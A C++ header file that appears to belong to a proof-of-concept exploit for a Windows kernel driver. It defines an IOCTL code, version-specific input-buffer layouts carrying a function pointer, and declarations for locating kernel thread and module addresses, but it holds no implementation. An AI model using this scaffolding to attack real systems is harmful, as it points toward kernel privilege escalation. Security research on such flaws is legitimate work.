#pragma once

typedef struct _CFG_FUNCTION_WRAPPER {
  PVOID FunctionPointer;
} CFG_FUNCTION_WRAPPER, *PCFG_FUNCTION_WRAPPER;

typedef struct _AIP_SMART_HASH_IMAGE_FILE_W10 {
  UINT64 FirstArg; // 8 bytes - Reserved or used as needed
  PVOID Value;     // 8 bytes - Should be 0 according to the requirement
  PCFG_FUNCTION_WRAPPER
  PtrToFunctionWrapper; // 8 bytes - Points to CFG_FUNCTION_WRAPPER
} AIP_SMART_HASH_IMAGE_FILE_W10, *PAIP_SMART_HASH_IMAGE_FILE_W10;

typedef struct _AIP_SMART_HASH_IMAGE_FILE_W11 {
  UINT64 FirstArg; // 8 bytes - Reserved or used as needed
  PVOID Value;     // 8 bytes - Should be 0 according to the requirement
  PCFG_FUNCTION_WRAPPER
  PtrToFunctionWrapper; // 8 bytes - Points to CFG_FUNCTION_WRAPPER
  PVOID Unknown;        // 8 bytes - Reserved or used as needed
} AIP_SMART_HASH_IMAGE_FILE_W11, *PAIP_SMART_HASH_IMAGE_FILE_W11;

typedef struct SYSTEM_MODULE {
  ULONG Reserved1;
  ULONG Reserved2;
#ifdef _WIN64
  ULONG Reserved3;
#endif
  PVOID ImageBaseAddress;
  ULONG ImageSize;
  ULONG Flags;
  WORD Id;
  WORD Rank;
  WORD w018;
  WORD NameOffset;
  CHAR Name[255];
} SYSTEM_MODULE, *PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
  ULONG ModulesCount;
  SYSTEM_MODULE Modules[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

class c_poc {
private:
  static constexpr uintptr_t IOCTL_AipSmartHashImageFile = 0x22A018;

  void *set_ioctl_buffer(size_t *k_thread_offset, OSVERSIONINFOEXW *os_info);

  UINT_PTR get_ethread_address();
  UINT_PTR get_file_object_address();
  UINT_PTR get_kernel_module_address(const char *TargetModule);
  BOOL scan_section_for_pattern(HANDLE h_process, LPVOID lp_base_address,
                                SIZE_T dw_size, BYTE *pattern,
                                SIZE_T pattern_size, LPVOID *lp_found_address);
  UINT_PTR find_pattern(HMODULE h_module);

  bool send_ioctl_request(HANDLE h_device, PVOID input_buffer,
                          size_t input_buffer_length);

public:
  c_poc() = default;
  ~c_poc() = default;

  bool act();
};

inline auto poc = std::make_unique<c_poc>();
